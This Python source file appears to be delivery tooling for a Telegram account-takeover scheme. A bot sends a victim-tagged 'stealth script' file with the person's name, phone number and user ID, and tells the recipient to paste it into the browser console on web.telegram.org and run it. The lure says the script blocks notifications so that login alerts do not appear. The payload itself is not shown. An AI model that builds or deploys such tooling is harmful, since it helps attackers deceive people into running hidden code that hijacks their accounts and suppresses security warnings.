"""
Simple Telegram Bot for Script Sending
Works with the current python-telegram-bot version and focuses on script delivery
"""

import os
import logging
import requests
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

logger = logging.getLogger(__name__)

class SimpleTelegramBot:
    """Simple Telegram bot for sending scripts"""
    
    def __init__(self):
        self.token = os.getenv('TELEGRAM_BOT_TOKEN')
        if not self.token:
            logger.error("❌ TELEGRAM_BOT_TOKEN not found in environment")
            raise ValueError("TELEGRAM_BOT_TOKEN is required")
        
        self.base_url = f"https://api.telegram.org/bot{self.token}"
        logger.info(f"🤖 Simple Telegram Bot initialized with token: {self.token[:10]}...")
    
    def send_message(self, chat_id: int, text: str, parse_mode: str = 'Markdown') -> bool:
        """Send a message to a specific chat"""
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                'chat_id': chat_id,
                'text': text,
                'parse_mode': parse_mode
            }
            
            response = requests.post(url, json=data, timeout=10)
            response.raise_for_status()
            
            result = response.json()
            if result.get('ok'):
                logger.info(f"✅ Message sent to chat {chat_id}")
                return True
            else:
                logger.error(f"❌ Failed to send message: {result.get('description', 'Unknown error')}")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"❌ Network error sending message: {e}")
            return False
        except Exception as e:
            logger.error(f"❌ Error sending message: {e}")
            return False
    
    def send_script(self, chat_id: int, script_content: str, script_info: dict = None) -> bool:
        """Send a script file with information"""
        try:
            # Prepare header message
            header_parts = []
            
            if script_info:
                header_parts.append("🛡️ **Generated Stealth Script File**")
                header_parts.append("")
                header_parts.append(f"📁 **File:** `{script_info.get('filename', 'script.js')}`")
                header_parts.append(f"👤 **User:** {script_info.get('user_name', 'Unknown')}")
                header_parts.append(f"📱 **Phone:** +{script_info.get('phone', 'Unknown')}")
                header_parts.append(f"🆔 **User ID:** {script_info.get('user_id', 'Unknown')}")
                header_parts.append(f"⏰ **Generated:** {script_info.get('timestamp', 'Now')}")
                header_parts.append("")
            
            header_parts.extend([
                "📝 **Instructions:**",
                "1. Download the script file below",
                "2. Open https://web.telegram.org/a/ in your browser",
                "3. Press F12 to open Developer Tools", 
                "4. Go to Console tab",
                "5. Copy and paste the script content",
                "6. Press Enter to execute",
                ""
            ])
            
            header_parts.extend([
                "💡 **Tips:**",
                "- This stealth script blocks notifications to prevent login alerts",
                "- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)",
                "- Try refreshing the page first",
                "- Try using a different browser or incognito mode", 
                "- Check if your network allows WebSocket connections"
            ])
            
            header_text = "\n".join(header_parts)
            
            # Send header message
            if not self.send_message(chat_id, header_text):
                return False
            
            # Create temporary script file and send it
            import tempfile
            import os
            
            filename = script_info.get('filename', 'stealth_script.js') if script_info else 'stealth_script.js'
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as temp_file:
                temp_file.write(script_content)
                temp_file_path = temp_file.name
            
            try:
                # Send the script file
                with open(temp_file_path, 'rb') as script_file:
                    files = {'document': (filename, script_file, 'text/javascript')}
                    response = requests.post(
                        f"{self.base_url}/sendDocument",
                        data={'chat_id': chat_id},
                        files=files
                    )
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get('ok'):
                        logger.info(f"✅ Stealth script file sent to chat {chat_id}")
                        return True
                    else:
                        logger.error(f"❌ Failed to send script file: {result.get('description', 'Unknown error')}")
                        return False
                else:
                    logger.error(f"❌ Network error sending script file: {response.status_code}")
                    return False
                    
            finally:
                # Clean up temporary file
                try:
                    os.unlink(temp_file_path)
                except:
                    pass
                
        except Exception as e:
            logger.error(f"❌ Error sending script file: {e}")
            return False
    
    def test_connection(self) -> bool:
        """Test bot connection"""
        try:
            url = f"{self.base_url}/getMe"
            response = requests.get(url, timeout=5)
            response.raise_for_status()
            
            result = response.json()
            if result.get('ok'):
                bot_info = result.get('result', {})
                logger.info(f"✅ Bot connection successful: @{bot_info.get('username', 'Unknown')}")
                return True
            else:
                logger.error(f"❌ Bot connection failed: {result.get('description', 'Unknown error')}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Bot connection test failed: {e}")
            return False

# Global bot instance
simple_bot = SimpleTelegramBot() 